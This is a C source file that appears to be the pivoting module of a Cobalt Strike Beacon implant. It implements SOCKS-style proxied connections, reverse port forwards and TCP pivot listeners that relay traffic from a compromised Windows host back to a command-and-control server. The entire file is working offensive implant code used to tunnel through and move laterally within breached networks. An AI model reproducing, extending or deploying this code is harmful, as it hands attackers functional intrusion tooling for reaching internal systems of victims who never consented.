#include <winsock2.h>
#include "beacon.h"
#include "commands.h"
#include "channel.h"
#include "parse.h"
#include "bformat.h"
#include "linkint.h"

#define SOCKET_READ_MAX 1048576

#define STATE_DEAD    0
#define STATE_READ    1
#define STATE_CONNECT 2

#define LISTEN_NOTREALLY  0 
#define LISTEN_ONEOFF     1
#define LISTEN_PERSISTENT 2
#define LISTEN_TCPPIVOT   3

typedef struct {
	unsigned int id;
	unsigned int state;
	unsigned int timeout;
	unsigned int linger;
	unsigned int ltype;
	unsigned int lport;
	DWORD start;
	SOCKET socket;
 	void * next;
} socket_entry;

/* keep track of our sockets */
static socket_entry * pivot_list = NULL;  /* TODO: list of socket entries not released on exit, pivot_poll_reaper() seems to clean up list */

/* shared buffer for read data */
static char * read_buffer = NULL;         /* TODO allocated memory not released on exit. */

/* listening socket ID pool */
static unsigned int lsock_id = 0;

/* recv all with some other data */
int recv_all(SOCKET MySock, char * buffer, int len) {
	int    tret   = 0;
	int    nret   = 0;
	char * startb = buffer;
	while (tret < len) {
		nret = recv(MySock, (char *)startb, len - tret, 0);
		startb += nret;
		tret   += nret;

		if (nret == SOCKET_ERROR) {
			shutdown(MySock, SD_BOTH);
			closesocket(MySock);
			return SOCKET_ERROR;
		}
	}
	return tret;
}

/* add a socket to our list of sockets please */
void _add_socket(SOCKET socket, int id, int timeout, unsigned int ltype, unsigned int lport, unsigned int state) {
	socket_entry * entry = (socket_entry *)malloc(sizeof(socket_entry));
	socket_entry * temp = pivot_list;

	entry->id      = id;
	entry->socket  = socket;
	entry->next    = pivot_list;
	entry->state   = state;
	entry->start   = GetTickCount();
	entry->timeout = timeout;
	entry->linger  = 0;
	entry->ltype   = ltype;
	entry->lport   = lport;

	/* loop through our pivot list, invalidate any sockets with the same id */
	while (temp != NULL) {
		if (temp->id == id)
			temp->state = STATE_DEAD;
		temp = (socket_entry *)temp->next;
	}

	/* add our new socket to the list */
	pivot_list = entry;
}

void add_socket(SOCKET socket, int id, int timeout) {
	_add_socket(socket, id, timeout, LISTEN_NOTREALLY, 0, STATE_CONNECT);
}

/* listen for a connection now */
SOCKET generic_listen(DWORD bindto, unsigned int port, unsigned int backlog) {
	SOCKET MySock = INVALID_SOCKET;
	struct sockaddr_in sock;
	int             status = 0;
	unsigned long   mode = 1; /* enable non-blocking I/O */

	/* init winsock */
	channel_winsock_init();

	/* setup our socket */
	MySock = socket(AF_INET, SOCK_STREAM, 0);
	if (MySock == INVALID_SOCKET) {
		return INVALID_SOCKET;
	}

	/* specify the host/port we want to bind to */
	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);
	sock.sin_addr.s_addr = bindto;

	/* make the SOCKET non-blocking */
	status = ioctlsocket(MySock, FIONBIO, &mode);
	if (status == SOCKET_ERROR) {
		closesocket(MySock);
		return INVALID_SOCKET;
	}

	/* make it into a server */
	status = bind(MySock, (SOCKADDR*)&sock, sizeof(sock));
	if (status == SOCKET_ERROR) {
		closesocket(MySock);
		return INVALID_SOCKET;
	}

	/* listen for a connection... *pHEAR* */
	status = listen(MySock, backlog);
	if (status == SOCKET_ERROR) {
		closesocket(MySock);
		return INVALID_SOCKET;
	}

	/* ok, I believe we probably did everything right to this point */
	return MySock;
}

/* listen for a connection now */
void command_listen(char * buffer, int length, void (*callback)(char * buffer, int length, int type)) {
	datap            parser;
	SOCKET MySock = INVALID_SOCKET;
	int              id   = 0;
	unsigned short   port = 0;

	/* parse our id value */
	id = data_int(&parser);

	/* parse our port value */
	port = data_short(&parser);

	/* setup our listening socket */
	MySock = generic_listen(INADDR_ANY, port, 1);

	/* handle the socket correctly */
	if (MySock == INVALID_SOCKET) {
		callback((char *)buffer, sizeof(int), CALLBACK_CLOSE);
	}
	else {
		/* ok, I believe we probably did everything right to this point */
		_add_socket(MySock, id, 180000, LISTEN_ONEOFF, port, STATE_CONNECT);
	}
}

/* attempt to create a connection and store it for polling later */
void command_connect(char * buffer, int length, void (*callback)(char * buffer, int length, int type)) {
	struct hostent * pTarget = NULL;
	struct sockaddr_in sock;
	SOCKET MySock = INVALID_SOCKET;
	char host[1024];
	int              id   = 0;
	int             fid   = 0;
	unsigned short  port  = 0;
	int  status = 0;
	unsigned long   mode  = 1; /* enable non-blocking I/O */

	/* [id : 4 bytes][port : 2 bytes][host : the rest] */

	/* parse our id value */
	memcpy((void *)&id, buffer, sizeof(int));
	buffer += sizeof(int);
	length -= sizeof(int);
	fid = id;
	id  = ntohl(id);

	/* parse our port value */
	memcpy((void *)&port, buffer, sizeof(unsigned short));
	buffer += sizeof(unsigned short);
	length -= sizeof(unsigned short);
	port = ntohs(port);

	/* parse out the host value */
	if (length >= 1023)
		length = 1023;

	memcpy((void *)host, buffer, length);
	host[length] = '\0';

	/* init winsock */
	channel_winsock_init();

	/* setup our socket */
	MySock = socket(AF_INET, SOCK_STREAM, 0);
	if (MySock == INVALID_SOCKET) {
		closesocket(MySock);
		callback((char *)&fid, sizeof(int), CALLBACK_CLOSE);
		return;
	}

	/* resolve our target */
	pTarget = gethostbyname(host);
	if (pTarget == NULL) {
		closesocket(MySock);
		callback((char *)&fid, sizeof(int), CALLBACK_CLOSE);
		return;
	}

	/* copy our target information into the sock */
	memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length);
	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);

	/* make the SOCKET non-blocking */
	status = ioctlsocket(MySock, FIONBIO, &mode);
	if (status == SOCKET_ERROR) {
		closesocket(MySock);
		callback((char *)&fid, sizeof(int), CALLBACK_CLOSE);
		return;
	}

	/* issue our connection */
	status = connect(MySock, (struct sockaddr *)&sock, sizeof(sock));
	if (status == SOCKET_ERROR && WSAGetLastError() != WSAEWOULDBLOCK) {
		closesocket(MySock);
		callback((char *)&fid, sizeof(int), CALLBACK_CLOSE);
		return;
	}

	/* ok, I believe we probably did everything right to this point */
	add_socket(MySock, id, 30000);
}

/* find out when the socket is ready for data and send it */
void send_helper(socket_entry * temp, char * buffer, int length) {
	struct timeval tv;
	fd_set         s_write, s_error;
	unsigned int status = 0;
	unsigned int timeout = GetTickCount() + 30000; /* max of 30s to write out to socket */

	tv.tv_sec  = 0;
	tv.tv_usec = 100; 

	while (GetTickCount() < timeout) {
		FD_ZERO(&s_write);
		FD_ZERO(&s_error);

		FD_SET(temp->socket, &s_write);
		FD_SET(temp->socket, &s_error);

		select(0, NULL, &s_write, &s_error, &tv);

		if (FD_ISSET(temp->socket, &s_error)) {
			return;
		}
		else if (FD_ISSET(temp->socket, &s_write)) {
			status = send(temp->socket, buffer, length, 0);
			if (status == SOCKET_ERROR && WSAGetLastError() == WSAEWOULDBLOCK) {
				/* We should try this operation again in a little bit */
				Sleep(1000);
			}
			else {
				return;
			}
		}
	}
}

void command_send(char * buffer, int length) {
	socket_entry * temp = pivot_list;
	int              id = 0;
	unsigned int status = 0;

	/* [id : 4 bytes][data : the rest] */

	/* parse our id value */
	memcpy((void *)&id, buffer, sizeof(int));
	buffer += sizeof(int);
	length -= sizeof(int);
	id = ntohl(id);

	while (temp != NULL) {
		/* skip dead sockets */
		if (temp->state != STATE_READ) {
			temp = (socket_entry*)temp->next;
			continue;
		}

		/* if we have a match, send the data */
		if (id == temp->id) {
			send_helper(temp, buffer, length);
		}

		temp = (socket_entry*)temp->next;
	}
}

void command_close(char * buffer, int length) {
	socket_entry * temp = pivot_list;
	int              id = 0;

	/* parse our id value */
	memcpy((void *)&id, buffer, sizeof(int));
	buffer += sizeof(int);
	length -= sizeof(int);
	id = ntohl(id);

	while (temp != NULL) {
		/* skip dead sockets */
		if (temp->state == STATE_DEAD) {
			temp = (socket_entry*)temp->next;
			continue;
		}

		/* if we have a match, kill the socket */
		if (id == temp->id && temp->ltype != LISTEN_PERSISTENT) {
			temp->state = STATE_DEAD;
		}

		temp = (socket_entry*)temp->next;
	}
}

DWORD nextId() {
	return (lsock_id++ % 67108864) + 67108864;
}

/* check for sockets that are now connected and ready to use */
void pivot_poll_checker(void (*callback)(char * buffer, int length, int type)) {
	SOCKET lsock = INVALID_SOCKET;
	struct timeval tv;
	fd_set         s_write, s_error, s_read;
	socket_entry * temp = pivot_list;
	unsigned int   fid  = 0;
	formatp        result;

	tv.tv_sec  = 0;
	tv.tv_usec = 100; 

	while (temp != NULL) {
		/* we only deal in sockets that are waiting to connect */
		if (temp->state != STATE_CONNECT) {
			temp = (socket_entry*)temp->next;
			continue;
		}

		fid = htonl(temp->id);

		/* zero out our set */
		FD_ZERO(&s_write);
		FD_ZERO(&s_error);
		FD_ZERO(&s_read);

		/* add socket to our set */
		FD_SET(temp->socket, &s_write);
		FD_SET(temp->socket, &s_error);
		FD_SET(temp->socket, &s_read);

		/* do we have a connection? */
		select(0, &s_read, &s_write, &s_error, &tv);

		/* one of our reverse port forwards */
		if (temp->ltype == LISTEN_PERSISTENT) {
			/* a listening socket is ready to accept a connection */
			if (FD_ISSET(temp->socket, &s_read)) {
				unsigned long mode = 1; /* enable non-blocking I/O */

				/* accept the connection */
				lsock = accept(temp->socket, NULL, NULL);

				/* put the socket into non-blocking mode and continue on... */
				if (ioctlsocket(lsock, FIONBIO, &mode) != SOCKET_ERROR) {
					/* assign an id to it */
					fid = nextId();

					/* register this socket with STATE_READ */
					_add_socket(lsock, fid, 180000, LISTEN_NOTREALLY, 0, STATE_READ);

					/* let the controller know we have a new connection */
					bformat_init(&result, 128);
					bformat_int(&result, fid);
					bformat_int(&result, temp->lport);

					callback(bformat_string(&result), bformat_length(&result), CALLBACK_ACCEPT);

					bformat_free(&result);
				}
				/* if we failed to go to non-blocking mode, close the socket */
				else {
					closesocket(lsock);
					return;
				}
			}
		}
		/* a TCP pivot. :) */
		else if (temp->ltype == LISTEN_TCPPIVOT) {
			/* a listening socket is ready to accept a connection */
			if (FD_ISSET(temp->socket, &s_read)) {
				/* accept the connection */
				lsock = accept(temp->socket, NULL, NULL);

				/* register this as a named pipe Beacon, please */
				link_register(lchannel_tcp(lsock), CHANNEL_REVERSE_TCP(temp->lport), callback);
			}
		}
		/* treat SOCKS sockets differently... thanks! */
		else {
			/* is the socket dead? */
			if (FD_ISSET(temp->socket, &s_error)) {
				temp->state = STATE_DEAD;
				callback((char *)&fid, sizeof(int), CALLBACK_CLOSE);
			}
			/* is the socket alive and ready to write to? */
			else if (FD_ISSET(temp->socket, &s_write)) {
				temp->state = STATE_READ;
				callback((char *)&fid, sizeof(int), CALLBACK_CONNECT);
			}
			/* a listening socket is ready to accept a connection */
			else if (FD_ISSET(temp->socket, &s_read)) {
				/* store the listening socket */
				lsock = temp->socket;

				/* accept the connection */
				temp->socket = accept(lsock, NULL, NULL);

				if (temp->socket == INVALID_SOCKET) {
					/* if something went wrong, report it as a failure */
					temp->state = STATE_DEAD;
					callback((char *)&fid, sizeof(int), CALLBACK_CLOSE);
				}
				else {
					/* otherwise, we're ready to rock, let's do it! */
					temp->state = STATE_READ;
					callback((char *)&fid, sizeof(int), CALLBACK_CONNECT);
				}

				/* close the listening socket, we don't need it anymore */
				closesocket(lsock);
			}
			/* this socket is dead, or we're not waiting for it anyways */
			else if ((GetTickCount() - temp->start) > temp->timeout) {
				temp->state = STATE_DEAD;
				callback((char *)&fid, sizeof(int), CALLBACK_CLOSE);
			}
		}

		/* advance to the net socket please */
		temp = (socket_entry*)temp->next;
	}
}

/* check for sockets that are now connected and ready to use */
void pivot_poll_reaper(void (*callback)(char * buffer, int length, int type)) {
	socket_entry * temp = pivot_list;
	socket_entry * prev = NULL;
	unsigned int   fid  = 0;
	unsigned int   status = 0;

	/* let's clean up dead sockets from our list plz */
	while (temp != NULL) {
		if (temp->state == STATE_DEAD && temp->linger == 0) {
			temp->linger = GetTickCount();
			prev = temp;
			temp = (socket_entry*)temp->next;
		}
		/* kill sockets after 1s... to allow any unsent data to get sent please */
		else if (temp->state == STATE_DEAD && ((GetTickCount() - temp->linger) > 1000)) {
			/* shutdown the socket */
			if (temp->ltype == LISTEN_NOTREALLY)
				shutdown(temp->socket, SD_BOTH);

			/* do not let go of this item until socket is really dead. Thanks! */
			if (closesocket(temp->socket) != 0 && temp->ltype == LISTEN_PERSISTENT) {
				prev = temp;
				temp = (socket_entry*)temp->next;
				continue;
			}

			/* unlink the socket from our list */
			if (prev == NULL) {
				pivot_list = (socket_entry*)temp->next;
				free(temp);
				temp = NULL;    /* TODO Question: should this be: temp = pivot_list; */
			}
			else {
				prev->next = temp->next;
				free(temp);
				temp = (socket_entry*)prev->next;
			}
		}
		else {
			prev = temp;
			temp = (socket_entry*)temp->next;
		}
	}
}

/* check for sockets ready to be read from */
int pivot_poll_reader(void (*callback)(char * buffer, int length, int type)) {
	unsigned long ret   = 0;
	unsigned long count = 0;
	unsigned int fid   = 0;
	socket_entry * temp = pivot_list;
	int status = 0;
	int read   = 0;

	/* allocate our read buffer plz */
	if (read_buffer == NULL)
		read_buffer = (char *)malloc(SOCKET_READ_MAX);

	while (temp != NULL) {
		/* if the socket is dead, go to the next item */
		if (temp->state != STATE_READ) {
			temp = (socket_entry*)temp->next;
			continue;
		}

		/* fix the id */
		fid = htonl(temp->id);

		/* copy the connection id to the beginning of the buffer */
		memcpy(read_buffer, &fid, sizeof(unsigned int));

		/* how many bytes are available for reading? */
		status = ioctlsocket(temp->socket, FIONREAD, &count);

		/* we have a fixed buffer, let's not overdo it */
		if (count > (SOCKET_READ_MAX - 4))
			count = SOCKET_READ_MAX - 4;

		/* did an error occur? kill our socket! */
		if (status == SOCKET_ERROR) {
			temp->state = STATE_DEAD;
			callback(read_buffer, sizeof(int), CALLBACK_CLOSE);
		}
		else if (count > 0) {
			/* read in our data, plz */
			ret = recv_all(temp->socket, read_buffer + sizeof(int), count);

			/* something went wrong? seriously? */
			if (ret == SOCKET_ERROR) {
				temp->state = STATE_DEAD;
				callback(read_buffer, sizeof(int), CALLBACK_CLOSE);
			}
			/* ok, we're all good... */
			else if (ret == count) {
				/* post the data plz */
				callback(read_buffer, count + sizeof(int), CALLBACK_READ);
				read += 1;
			}
		}

		/* next socket */
		temp = (socket_entry*)temp->next;
	}
	return read;
}

/* poll all of our sockets, see if there's anything to be read, read it, append it
   to a buffer, and at the end--post all of it back to Cobalt Strike */
void pivot_poll(void (*callback)(char * buffer, int length, int type)) {
	int   read;
	DWORD stopat;

	/* check for connections */
	pivot_poll_checker(callback);

	/* we are only going to allow reads to block for 3.5s... with HTTP POST C2 we'll never hit this,
	   but with GET ONLY and DNS it's a risk that ongoing reads can starve everything else */
	stopat = GetTickCount() + 3500;

	/* keep reading while we have data to read please */
	do {
		read = pivot_poll_reader(callback);
	} while (read > 0 && GetTickCount() < stopat);

	/* clean up any dead sockets */
	pivot_poll_reaper(callback);
}

BOOL is_bound(unsigned short port) {
	socket_entry * temp = pivot_list;

	/* loop through our sockets */
	while (temp != NULL) {
		/* check if we have a match */
		if (temp->state != STATE_DEAD && temp->ltype == LISTEN_PERSISTENT && temp->lport == port) {
			return TRUE;
		}

		temp = (socket_entry*)temp->next;
	}

	return FALSE;
}

/* bind a socket */
void command_socket_bind(char * buffer, int length, DWORD bindto) {
	datap            parser;
	SOCKET MySock = INVALID_SOCKET;
	unsigned short   port = 0;

	/* init our data parser */
	data_init(&parser, buffer, length);

	/* parse our port value */
	port = data_short(&parser);

	/* if we're already bound and managed here... do nothing */
	if (is_bound(port))
		return;

	/* setup our listening socket */
	MySock = generic_listen(bindto, port, 10);

	/* process the socket when it's up */
	if (MySock != INVALID_SOCKET) {
		_add_socket(MySock, nextId(), 0, LISTEN_PERSISTENT, port, STATE_CONNECT);
	}
	else {
		post_error_d(0x15, port);
	}
}

/* bind a socket */
void command_socket_tcppivot(char * buffer, int length) {
	datap            parser;
	SOCKET MySock = INVALID_SOCKET;
	unsigned short   port = 0;

	/* init our data parser */
	data_init(&parser, buffer, length);

	/* parse our port value */
	port = data_short(&parser);

	/* setup our listening socket */
	MySock = generic_listen(INADDR_ANY, port, 10);

	/* process the socket when it's up */
	if (MySock != INVALID_SOCKET) {
		_add_socket(MySock, nextId(), 0, LISTEN_TCPPIVOT, port, STATE_CONNECT);
	}
	else {
		post_error_d(0x15, port);
	}
}

/* close a bound socket */
void command_socket_close(char * buffer, int length) {
	datap parser;
	unsigned short port;
	socket_entry * temp = pivot_list;

	/* extract our argument */
	data_init(&parser, buffer, length);
	port = data_short(&parser);

	/* loop through our sockets */
	while (temp != NULL) {
		/* skip dead sockets */
		if (temp->state == STATE_DEAD) {
			temp = (socket_entry*)temp->next;
			continue;
		}

		/* if we have a match, kill the socket */
		if (temp->ltype == LISTEN_PERSISTENT && temp->lport == port) {
			temp->state = STATE_DEAD;
		}
		else if (temp->ltype == LISTEN_TCPPIVOT && temp->lport == port) {
			temp->state = STATE_DEAD;
		}

		temp = (socket_entry*)temp->next;
	}
}